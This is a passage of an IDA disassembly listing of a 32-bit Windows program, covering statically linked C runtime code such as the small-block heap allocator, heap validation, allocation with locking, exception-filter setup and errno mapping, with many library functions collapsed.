		jge	short loc_4056F2
		add	eax, 8
		inc	[ebp+var_4]
		cmp	dword ptr [eax], 0FFFFFFFFh
		jz	short loc_4056E1

loc_4056F2:				; CODE XREF: sub_4055C9+116j
					; sub_4055C9+11Cj
		mov	eax, [ebp+var_4]
		push	4		; flProtect
		shl	eax, 0Ch
		push	1000h		; flAllocationType
		push	eax		; dwSize
		push	esi		; lpAddress
		mov	[ebp+var_8], eax
		call	ds:VirtualAlloc
		cmp	eax, esi
		jnz	loc_4057CA
		push	0		; size_t
		push	[ebp+var_8]	; int
		push	esi		; void *
		call	_memset
		mov	edx, [ebp+var_4]
		add	esp, 0Ch
		test	edx, edx
		mov	ecx, ebx
		jle	short loc_405759
		lea	eax, [esi+4]
		mov	[ebp+var_4], edx

loc_40572F:				; CODE XREF: sub_4055C9+18Ej
		or	byte ptr [eax+0F4h], 0FFh
		lea	edx, [eax+4]
		mov	[eax-4], edx
		mov	edx, 0F0h
		mov	[eax], edx
		mov	[ecx], edx
		mov	dword ptr [ecx+4], 0F1h
		add	eax, 1000h
		add	ecx, 8
		dec	[ebp+var_4]
		jnz	short loc_40572F

loc_405759:				; CODE XREF: sub_4055C9+15Ej
		mov	off_43BA08, edi
		lea	eax, [edi+2018h]

loc_405765:				; CODE XREF: sub_4055C9+1A8j
		cmp	ecx, eax
		jnb	short loc_405775
		cmp	dword ptr [ecx], 0FFFFFFFFh
		jz	short loc_405773
		add	ecx, 8
		jmp	short loc_405765
; ---------------------------------------------------------------------------

loc_405773:				; CODE XREF: sub_4055C9+1A3j
		cmp	ecx, eax

loc_405775:				; CODE XREF: sub_4055C9+19Ej
		sbb	eax, eax
		and	eax, ecx
		mov	[edi+0Ch], eax
		mov	eax, [ebp+arg_0]
		mov	[esi+8], al
		mov	[edi+8], ebx
		sub	[ebx], eax
		sub	[esi+4], eax
		lea	ecx, [esi+eax+8]
		lea	eax, [esi+100h]
		mov	[esi], ecx
		jmp	short loc_4057CC
; ---------------------------------------------------------------------------

loc_405798:				; CODE XREF: sub_4055C9+F2j
		call	sub_4052D1
		test	eax, eax
		jz	short loc_4057CA
		mov	ecx, [eax+10h]
		mov	[ecx+8], bl
		lea	edx, [ecx+ebx+8]
		mov	off_43BA08, eax
		mov	[ecx], edx
		mov	edx, 0F0h
		sub	edx, ebx
		mov	[ecx+4], edx
		movzx	edx, bl
		sub	[eax+18h], edx
		lea	eax, [ecx+100h]
		jmp	short loc_4057CC
; ---------------------------------------------------------------------------

loc_4057CA:				; CODE XREF: sub_4055C9+143j
					; sub_4055C9+1D6j
		xor	eax, eax

loc_4057CC:				; CODE XREF: sub_4055C9+D6j
					; sub_4055C9+1CDj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4055C9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4057D1	proc near		; CODE XREF: sub_4055C9+4Ap
					; sub_4055C9+99p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, [ebp+arg_0]
		mov	edx, [ebp+arg_8]
		push	ebx
		push	esi
		mov	esi, [ecx+4]
		push	edi
		mov	edi, [ecx]
		lea	ebx, [ecx+0F8h]
		cmp	esi, edx
		mov	[ebp+var_4], edi
		mov	eax, edi
		mov	[ebp+arg_0], ebx
		jb	short loc_405816
		lea	eax, [edi+edx]
		mov	[edi], dl
		cmp	eax, ebx
		jnb	short loc_405805
		add	[ecx], edx
		sub	[ecx+4], edx
		jmp	short loc_40580E
; ---------------------------------------------------------------------------

loc_405805:				; CODE XREF: sub_4057D1+2Bj
		and	dword ptr [ecx+4], 0
		lea	eax, [ecx+8]
		mov	[ecx], eax

loc_40580E:				; CODE XREF: sub_4057D1+32j
		lea	eax, [edi+8]
		jmp	loc_4058E4
; ---------------------------------------------------------------------------

loc_405816:				; CODE XREF: sub_4057D1+22j
		add	esi, edi
		cmp	byte ptr [esi],	0
		jz	short loc_40581F
		mov	eax, esi

loc_40581F:				; CODE XREF: sub_4057D1+4Aj
		lea	esi, [eax+edx]
		cmp	esi, ebx
		jnb	short loc_405869

loc_405826:				; CODE XREF: sub_4057D1+96j
		mov	bl, [eax]
		test	bl, bl
		jnz	short loc_40585C
		push	1
		lea	ebx, [eax+1]
		pop	esi

loc_405832:				; CODE XREF: sub_4057D1+68j
		cmp	byte ptr [ebx],	0
		jnz	short loc_40583B
		inc	ebx
		inc	esi
		jmp	short loc_405832
; ---------------------------------------------------------------------------

loc_40583B:				; CODE XREF: sub_4057D1+64j
		cmp	esi, edx
		jnb	short loc_40588D
		cmp	eax, [ebp+var_4]
		jnz	short loc_405849
		mov	[ecx+4], esi
		jmp	short loc_405855
; ---------------------------------------------------------------------------

loc_405849:				; CODE XREF: sub_4057D1+71j
		sub	[ebp+arg_4], esi
		cmp	[ebp+arg_4], edx
		jb	loc_4058EE

loc_405855:				; CODE XREF: sub_4057D1+76j
		mov	edi, [ebp+var_4]
		mov	eax, ebx
		jmp	short loc_405861
; ---------------------------------------------------------------------------

loc_40585C:				; CODE XREF: sub_4057D1+59j
		movzx	esi, bl
		add	eax, esi

loc_405861:				; CODE XREF: sub_4057D1+89j
		lea	esi, [eax+edx]
		cmp	esi, [ebp+arg_0]
		jb	short loc_405826

loc_405869:				; CODE XREF: sub_4057D1+53j
		lea	esi, [ecx+8]

loc_40586C:				; CODE XREF: sub_4057D1+EBj
					; sub_4057D1+F2j
		cmp	esi, edi
		jnb	short loc_4058EE
		lea	eax, [esi+edx]
		cmp	eax, [ebp+arg_0]
		jnb	short loc_4058EE
		mov	al, [esi]
		test	al, al
		jnz	short loc_4058BE
		push	1
		lea	ebx, [esi+1]
		pop	eax

loc_405884:				; CODE XREF: sub_4057D1+BAj
		cmp	byte ptr [ebx],	0
		jnz	short loc_4058AE
		inc	ebx
		inc	eax
		jmp	short loc_405884
; ---------------------------------------------------------------------------

loc_40588D:				; CODE XREF: sub_4057D1+6Cj
		lea	ebx, [eax+edx]
		cmp	ebx, [ebp+arg_0]
		jnb	short loc_40589E
		sub	esi, edx
		mov	[ecx], ebx
		mov	[ecx+4], esi
		jmp	short loc_4058A7
; ---------------------------------------------------------------------------

loc_40589E:				; CODE XREF: sub_4057D1+C2j
		and	dword ptr [ecx+4], 0
		lea	esi, [ecx+8]
		mov	[ecx], esi

loc_4058A7:				; CODE XREF: sub_4057D1+CBj
		mov	[eax], dl
		add	eax, 8
		jmp	short loc_4058E4
; ---------------------------------------------------------------------------

loc_4058AE:				; CODE XREF: sub_4057D1+B6j
		cmp	eax, edx
		jnb	short loc_4058C5
		sub	[ebp+arg_4], eax
		cmp	[ebp+arg_4], edx
		jb	short loc_4058EE
		mov	esi, ebx
		jmp	short loc_40586C
; ---------------------------------------------------------------------------

loc_4058BE:				; CODE XREF: sub_4057D1+ABj
		movzx	eax, al
		add	esi, eax
		jmp	short loc_40586C
; ---------------------------------------------------------------------------

loc_4058C5:				; CODE XREF: sub_4057D1+DFj
		lea	ebx, [esi+edx]
		cmp	ebx, [ebp+arg_0]
		jnb	short loc_4058D6
		sub	eax, edx
		mov	[ecx], ebx
		mov	[ecx+4], eax
		jmp	short loc_4058DF
; ---------------------------------------------------------------------------

loc_4058D6:				; CODE XREF: sub_4057D1+FAj
		and	dword ptr [ecx+4], 0
		lea	eax, [ecx+8]
		mov	[ecx], eax

loc_4058DF:				; CODE XREF: sub_4057D1+103j
		mov	[esi], dl
		lea	eax, [esi+8]

loc_4058E4:				; CODE XREF: sub_4057D1+40j
					; sub_4057D1+DBj
		imul	ecx, 0Fh
		shl	eax, 4
		sub	eax, ecx
		jmp	short loc_4058F0
; ---------------------------------------------------------------------------

loc_4058EE:				; CODE XREF: sub_4057D1+7Ej
					; sub_4057D1+9Dj ...
		xor	eax, eax

loc_4058F0:				; CODE XREF: sub_4057D1+11Bj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4057D1	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4058F5	proc near		; CODE XREF: sub_40BBAD+202p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	edx, [ebp+arg_8]
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		movzx	ecx, byte ptr [edx]
		push	edi
		mov	edi, [ebp+arg_0]
		and	[ebp+var_4], 0
		mov	eax, ebx
		sub	eax, [edi+10h]
		sar	eax, 0Ch
		cmp	ecx, [ebp+arg_C]
		lea	edi, [edi+eax*8+18h]
		jbe	short loc_40592F
		mov	eax, [ebp+arg_C]
		sub	ecx, eax
		mov	[edx], al
		add	[edi], ecx
		mov	dword ptr [edi+4], 0F1h
		jmp	short loc_40598F
; ---------------------------------------------------------------------------

loc_40592F:				; CODE XREF: sub_4058F5+26j
		jnb	short loc_405996
		mov	eax, [ebp+arg_C]
		lea	esi, [edx+eax]
		lea	eax, [ebx+0F8h]
		cmp	esi, eax
		ja	short loc_405996
		lea	eax, [ecx+edx]

loc_405944:				; CODE XREF: sub_4058F5+59j
		cmp	eax, esi
		jnb	short loc_405952
		cmp	byte ptr [eax],	0
		jnz	short loc_405950
		inc	eax
		jmp	short loc_405944
; ---------------------------------------------------------------------------

loc_405950:				; CODE XREF: sub_4058F5+56j
		cmp	eax, esi

loc_405952:				; CODE XREF: sub_4058F5+51j
		jnz	short loc_405996
		mov	al, byte ptr [ebp+arg_C]
		mov	[edx], al
		mov	eax, [ebx]
		cmp	edx, eax
		ja	short loc_40598A
		cmp	esi, eax
		jbe	short loc_40598A
		lea	eax, [ebx+0F8h]
		cmp	esi, eax
		jnb	short loc_405981
		xor	eax, eax
		mov	[ebx], esi
		cmp	[esi], al
		jnz	short loc_40597C

loc_405975:				; CODE XREF: sub_4058F5+85j
		inc	eax
		cmp	byte ptr [esi+eax], 0
		jz	short loc_405975

loc_40597C:				; CODE XREF: sub_4058F5+7Ej
		mov	[ebx+4], eax
		jmp	short loc_40598A
; ---------------------------------------------------------------------------

loc_405981:				; CODE XREF: sub_4058F5+76j
		and	dword ptr [ebx+4], 0
		lea	eax, [ebx+8]
		mov	[ebx], eax

loc_40598A:				; CODE XREF: sub_4058F5+68j
					; sub_4058F5+6Cj ...
		sub	ecx, [ebp+arg_C]
		add	[edi], ecx

loc_40598F:				; CODE XREF: sub_4058F5+38j
		mov	[ebp+var_4], 1

loc_405996:				; CODE XREF: sub_4058F5:loc_40592Fj
					; sub_4058F5+4Aj ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4058F5	endp

; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		and	dword ptr [ebp-1Ch], 0
		push	ebx
		mov	edx, offset off_4399E8
		push	esi
		push	edi
		mov	[ebp-20h], edx

loc_4059B3:				; CODE XREF: .text:00405AC3j
		cmp	off_43BA08, edx
		jnz	short loc_4059BE
		inc	dword ptr [ebp-1Ch]

loc_4059BE:				; CODE XREF: .text:004059B9j
		mov	ecx, [edx+10h]
		cmp	ecx, 0FFFFFFFFh
		jz	loc_405AB6
		and	dword ptr [ebp-18h], 0
		and	dword ptr [ebp-0Ch], 0
		mov	ebx, ecx
		lea	eax, [edx+18h]
		mov	[ebp-14h], eax
		lea	edi, [ebx+8]

loc_4059DD:				; CODE XREF: .text:00405AB0j
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_4059F9
		cmp	dword ptr [ebp-0Ch], 0
		jnz	short loc_4059F1
		cmp	[edx+0Ch], eax
		jnz	loc_405AC8

loc_4059F1:				; CODE XREF: .text:004059E6j
		inc	dword ptr [ebp-0Ch]
		jmp	loc_405A97
; ---------------------------------------------------------------------------

loc_4059F9:				; CODE XREF: .text:004059E0j
		mov	esi, [ebx]
		lea	ecx, [edi+0F0h]
		cmp	esi, ecx
		jnb	loc_405ACD
		cmp	byte ptr [ecx],	0FFh
		jnz	loc_405AD2
		xor	ecx, ecx
		and	[ebp-8], ecx
		and	[ebp-10h], ecx
		and	[ebp-4], ecx

loc_405A1D:				; CODE XREF: .text:00405A88j
		lea	esi, [edi+ecx]
		cmp	esi, [ebx]
		jnz	short loc_405A2A
		inc	dword ptr [ebp-8]
		mov	eax, [ebp-14h]

loc_405A2A:				; CODE XREF: .text:00405A22j
		cmp	byte ptr [esi],	0
		jnz	short loc_405A38
		inc	dword ptr [ebp-10h]
		inc	dword ptr [ebp-4]
		inc	ecx
		jmp	short loc_405A82
; ---------------------------------------------------------------------------

loc_405A38:				; CODE XREF: .text:00405A2Dj
		mov	edx, [ebp-4]
		cmp	edx, [eax+4]
		jge	loc_405AD6
		cmp	dword ptr [ebp-8], 1
		jnz	short loc_405A5F
		mov	eax, edx
		cmp	eax, [edi-4]
		jl	loc_405ADA
		mov	eax, [ebp-14h]
		mov	dword ptr [ebp-8], 2

loc_405A5F:				; CODE XREF: .text:00405A48j
		and	dword ptr [ebp-4], 0
		lea	edx, [ecx+1]
		movzx	esi, byte ptr [esi]

loc_405A69:				; CODE XREF: .text:00405A7Bj
		add	esi, ecx
		cmp	edx, esi
		jge	short loc_405A7D
		cmp	byte ptr [edi+edx], 0
		jnz	short loc_405ADE
		movzx	esi, byte ptr [ecx+ebx+8]
		inc	edx
		jmp	short loc_405A69
; ---------------------------------------------------------------------------

loc_405A7D:				; CODE XREF: .text:00405A6Dj
		mov	ecx, edx
		mov	edx, [ebp-20h]

loc_405A82:				; CODE XREF: .text:00405A36j
		cmp	ecx, 0F0h
		jl	short loc_405A1D
		mov	ecx, [ebp-10h]
		cmp	ecx, [eax]
		jnz	short loc_405AE2
		cmp	dword ptr [ebp-8], 0
		jz	short loc_405AE6

loc_405A97:				; CODE XREF: .text:004059F4j
		inc	dword ptr [ebp-18h]
		mov	ecx, 1000h
		add	eax, 8
		add	ebx, ecx
		add	edi, ecx
		cmp	dword ptr [ebp-18h], 400h
		mov	[ebp-14h], eax
		jl	loc_4059DD

loc_405AB6:				; CODE XREF: .text:004059C4j
		mov	edx, [edx]
		cmp	edx, offset off_4399E8
		mov	[ebp-20h], edx
		jz	short loc_405AEA
		jmp	loc_4059B3
; ---------------------------------------------------------------------------

loc_405AC8:				; CODE XREF: .text:004059EBj
		or	eax, 0FFFFFFFFh
		jmp	short loc_405AF7
; ---------------------------------------------------------------------------

loc_405ACD:				; CODE XREF: .text:00405A03j
		push	0FFFFFFFEh

loc_405ACF:				; CODE XREF: .text:00405AD4j
					; .text:00405AD8j ...
		pop	eax
		jmp	short loc_405AF7
; ---------------------------------------------------------------------------

loc_405AD2:				; CODE XREF: .text:00405A0Cj
		push	0FFFFFFFDh
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405AD6:				; CODE XREF: .text:00405A3Ej
		push	0FFFFFFFCh
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405ADA:				; CODE XREF: .text:00405A4Fj
		push	0FFFFFFFBh
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405ADE:				; CODE XREF: .text:00405A73j
		push	0FFFFFFFAh
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405AE2:				; CODE XREF: .text:00405A8Fj
		push	0FFFFFFF9h
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405AE6:				; CODE XREF: .text:00405A95j
		push	0FFFFFFF8h
		jmp	short loc_405ACF
; ---------------------------------------------------------------------------

loc_405AEA:				; CODE XREF: .text:00405AC1j
		mov	eax, [ebp-1Ch]
		neg	eax
		sbb	eax, eax
		and	eax, 9
		add	eax, 0FFFFFFF7h

loc_405AF7:				; CODE XREF: .text:00405ACBj
					; .text:00405AD0j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; [00000029 BYTES: COLLAPSED FUNCTION __mtinitlocks. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000006C BYTES: COLLAPSED FUNCTION __mtdeletelocks. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000061 BYTES: COLLAPSED FUNCTION __lock. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000015 BYTES: COLLAPSED FUNCTION __unlock.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__lockerr_exit:
		push	dword ptr [esp+4]
		push	0
		call	ds:FatalAppExitA
; ---------------------------------------------------------------------------
		push	0FFh
		call	ds:ExitProcess
; ---------------------------------------------------------------------------
		retn
; [00000046 BYTES: COLLAPSED FUNCTION __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS	*). PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_405C65	proc near		; DATA XREF: .data:00413410o
		push	offset ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		mov	lpfn, eax
		retn
sub_405C65	endp


; =============== S U B	R O U T	I N E =======================================


sub_405C76	proc near		; DATA XREF: .data:00413924o
		push	lpfn		; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		retn
sub_405C76	endp

; [0000001C BYTES: COLLAPSED FUNCTION _ValidateRead(void const *,uint).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION _ValidateWrite(void *,uint). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION _ValidateExecute(int (*)(void)). PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy. PRESS KEYPAD CTRL-"+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4060A5	proc near		; CODE XREF: __mtinit+1Ap __getptd+20p ...

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

; FUNCTION CHUNK AT 00406147 SIZE 0000009B BYTES

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset stru_4113D8
		push	offset __except_handler3
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 18h
		push	ebx
		push	esi
		push	edi
		mov	esi, [ebp+arg_0]
		imul	esi, [ebp+arg_4]
		mov	[ebp+arg_4], esi
		mov	[ebp+var_1C], esi
		cmp	esi, 0FFFFFFE0h
		ja	short loc_4060EE
		xor	ebx, ebx
		cmp	esi, ebx
		jnz	short loc_4060E3
		push	1
		pop	esi

loc_4060E3:				; CODE XREF: sub_4060A5+39j
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		mov	[ebp+arg_4], esi
		jmp	short loc_4060F0
; ---------------------------------------------------------------------------

loc_4060EE:				; CODE XREF: sub_4060A5+33j
		xor	ebx, ebx

loc_4060F0:				; CODE XREF: sub_4060A5+47j
					; sub_4060A5+115j
		mov	[ebp+var_20], ebx
		cmp	esi, 0FFFFFFE0h
		ja	loc_4061A4
		mov	eax, dword_43DBA8
		cmp	eax, 3
		jnz	short loc_406147
		mov	edi, [ebp+var_1C]
		cmp	edi, dword_43DB94
		ja	short loc_40618D
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], ebx
		push	edi
		call	___sbh_alloc_block
		pop	ecx
		mov	[ebp+var_20], eax
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_40613E
; ---------------------------------------------------------------------------

loc_40612F:				; CODE XREF: sub_4060A5+A1j
		cmp	[ebp+var_20], ebx
		jz	short loc_406192
		push	[ebp+var_1C]
		jmp	short loc_406181
; ---------------------------------------------------------------------------

loc_406139:				; DATA XREF: .rdata:stru_4113D8o
		xor	ebx, ebx	; Finally handler 0 for	function 4060A5
		mov	esi, [ebp+arg_4]

loc_40613E:				; CODE XREF: sub_4060A5+85j
		push	9
		call	__unlock
		pop	ecx
		retn
sub_4060A5	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_4060A5

loc_406147:				; CODE XREF: sub_4060A5+5Fj
		cmp	eax, 2
		jnz	short loc_40618D
		cmp	esi, dword_43BA0C
		ja	short loc_40618D
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], 1
		mov	eax, esi
		shr	eax, 4
		push	eax
		call	sub_4055C9
		pop	ecx
		mov	[ebp+var_20], eax
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_4061C7
; ---------------------------------------------------------------------------

loc_40617B:				; CODE XREF: sub_4060A5+12Aj
		cmp	[ebp+var_20], ebx
		jz	short loc_406192
		push	esi		; size_t

loc_406181:				; CODE XREF: sub_4060A5+92j
		push	ebx		; int
		push	[ebp+var_20]	; void *
		call	_memset
		add	esp, 0Ch

loc_40618D:				; CODE XREF: sub_4060A5+6Aj
					; sub_4060A5+A5j ...
		cmp	[ebp+var_20], ebx
		jnz	short loc_4061D0

loc_406192:				; CODE XREF: sub_4060A5+8Dj
					; sub_4060A5+D9j
		push	esi		; dwBytes
		push	8		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	[ebp+var_20], eax

loc_4061A4:				; CODE XREF: sub_4060A5+51j
		cmp	[ebp+var_20], ebx
		jnz	short loc_4061D0
		cmp	dword_43D6A4, ebx
		jz	short loc_4061D0
		push	esi
		call	__callnewh
		pop	ecx
		test	eax, eax
		jnz	loc_4060F0
		jmp	short loc_4061D3
; ---------------------------------------------------------------------------

loc_4061C2:				; DATA XREF: .rdata:stru_4113D8o
		xor	ebx, ebx	; Finally handler 1 for	function 4060A5
		mov	esi, [ebp+arg_4]

loc_4061C7:				; CODE XREF: sub_4060A5+D1j
		push	9
		call	__unlock
		pop	ecx
		retn
; ---------------------------------------------------------------------------

loc_4061D0:				; CODE XREF: sub_4060A5+EBj
					; sub_4060A5+102j ...
		mov	eax, [ebp+var_20]

loc_4061D3:				; CODE XREF: sub_4060A5+11Bj
		mov	ecx, [ebp+ms_exc.registration.Next]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; END OF FUNCTION CHUNK	FOR sub_4060A5
; [00000017 BYTES: COLLAPSED FUNCTION _abort. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	1
		push	0
		push	dword ptr [esp+0Ch]
		call	_x_ismbbtype
		add	esp, 0Ch
		retn
; [00000011 BYTES: COLLAPSED FUNCTION __ismbbkprint. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbbkpunct. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __ismbbalnum. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __ismbbalpha. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __ismbbgraph. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __ismbbprint. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbbpunct. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbbtrail. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000027 BYTES: COLLAPSED FUNCTION __ismbbkana. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001AD BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000010 BYTES: COLLAPSED FUNCTION __getmbcp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy_0. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION _strtol. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000205 BYTES: COLLAPSED FUNCTION _strtoxl.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	1
		push	dword ptr [esp+10h]
		push	dword ptr [esp+10h]
		push	dword ptr [esp+10h]
		call	_strtoxl
		add	esp, 10h
		retn
; ---------------------------------------------------------------------------
		align 10h
; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION _strchr.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION _strncmp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000182 BYTES: COLLAPSED FUNCTION _signal. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000062 BYTES: COLLAPSED FUNCTION ctrlevent_capture(x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000182 BYTES: COLLAPSED FUNCTION _raise. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION _siglookup. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------
		call	__getptd
		add	eax, 58h
		retn
; ---------------------------------------------------------------------------
		call	__getptd
		add	eax, 54h
		retn
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	esi
		call	___doserrno
		mov	ecx, [esp+8]
		xor	esi, esi
		mov	[eax], ecx
		mov	eax, offset dword_43BDE0

loc_4078F8:				; CODE XREF: .text:00407905j
		cmp	ecx, [eax]
		jz	short loc_40791E
		add	eax, 8
		inc	esi
		cmp	eax, offset dword_43BF48
		jb	short loc_4078F8
		cmp	ecx, 13h
		jb	short loc_40792E
		cmp	ecx, 24h
		ja	short loc_40792E
		call	__errno
		mov	dword ptr [eax], 0Dh
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_40791E:				; CODE XREF: .text:004078FAj
		call	__errno
		mov	ecx, dword_43BDE4[esi*8]
		pop	esi
		mov	[eax], ecx
		retn
; ---------------------------------------------------------------------------

loc_40792E:				; CODE XREF: .text:0040790Aj
					; .text:0040790Fj
		cmp	ecx, 0BCh
		jb	short loc_40794B
		cmp	ecx, 0CAh
		ja	short loc_40794B
		call	__errno
		mov	dword ptr [eax], 8
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_40794B:				; CODE XREF: .text:00407934j
					; .text:0040793Cj
		call	__errno
		mov	dword ptr [eax], 16h
		pop	esi
		retn
; [00000009 BYTES: COLLAPSED FUNCTION __errno. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION ___doserrno. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000008 BYTES: COLLAPSED FUNCTION __toupper. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000006F BYTES: COLLAPSED FUNCTION _toupper.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000CC BYTES: COLLAPSED FUNCTION _toupper_0. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS KEYPAD CTRL-"+" TO EXPAND]
